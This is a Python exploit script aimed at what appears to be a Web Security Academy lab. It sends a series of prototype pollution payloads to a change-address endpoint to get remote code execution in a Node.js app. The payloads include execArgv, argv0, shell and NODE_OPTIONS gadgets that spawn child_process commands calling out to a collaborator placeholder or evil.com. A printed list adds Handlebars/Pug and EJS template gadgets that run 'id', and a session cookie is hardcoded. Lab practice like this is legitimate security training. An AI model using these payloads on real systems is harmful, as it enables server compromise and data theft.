#!/usr/bin/env python3
import requests
import json

# Target URL and session
url = "https://0a36007b03e93889806be91c00600033.web-security-academy.net/my-account/change-address"
session = "LyOyePlmX1qIqQ5HxoRyN5C6kyeKQFj4"

headers = {
    "Cookie": f"session={session}",
    "Content-Type": "application/json;charset=UTF-8",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
}

# Common RCE gadgets for Node.js/Express
gadgets = [
    # Child process gadgets
    {
        "name": "child_process shell",
        "payload": {
            "__proto__": {
                "shell": "/bin/bash",
                "NODE_OPTIONS": "--inspect=evil.com:9229"
            }
        }
    },
    {
        "name": "execArgv gadget",
        "payload": {
            "__proto__": {
                "execArgv": ["--eval", "require('child_process').execSync('curl http://YOUR_COLLABORATOR_URL')"]
            }
        }
    },
    {
        "name": "env gadget",
        "payload": {
            "__proto__": {
                "env": {
                    "NODE_OPTIONS": "--require /proc/self/environ"
                }
            }
        }
    },
    {
        "name": "mainModule gadget",
        "payload": {
            "__proto__": {
                "main": {
                    "require": "child_process"
                }
            }
        }
    },
    {
        "name": "argv gadget",
        "payload": {
            "__proto__": {
                "argv0": "node --eval 'require(\"child_process\").exec(\"curl http://YOUR_COLLABORATOR_URL\")'"
            }
        }
    }
]

base_data = {
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienervillet",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": session
}

print("Testing RCE gadgets via prototype pollution...")
print("=" * 50)

for gadget in gadgets:
    print(f"\nTesting: {gadget['name']}")

    # Merge base data with gadget payload
    payload = {**base_data, **gadget['payload']}

    print(f"Payload: {json.dumps(gadget['payload'], indent=2)}")

    try:
        response = requests.post(url, headers=headers, json=payload, verify=False)
        print(f"Response status: {response.status_code}")

        if response.status_code != 200:
            print(f"Response: {response.text[:200]}")
    except Exception as e:
        print(f"Error: {e}")

    print("-" * 30)

print("\n" + "=" * 50)
print("Additional gadgets to try manually:")
print("""
1. For Handlebars/Pug template engines:
{
  "__proto__": {
    "client": true,
    "escapeFunction": "1; return process.mainModule.constructor._load('child_process').execSync('id')"
  }
}

2. For EJS templates:
{
  "__proto__": {
    "client": true,
    "escape": "1; return global.process.mainModule.constructor._load('child_process').execSync('id')"
  }
}

3. For async operations:
{
  "__proto__": {
    "shell": "node",
    "args": ["-e", "require('child_process').exec('curl http://YOUR_COLLABORATOR_URL')"]
  }
}

Replace YOUR_COLLABORATOR_URL with your Burp Collaborator URL to detect successful RCE.
""")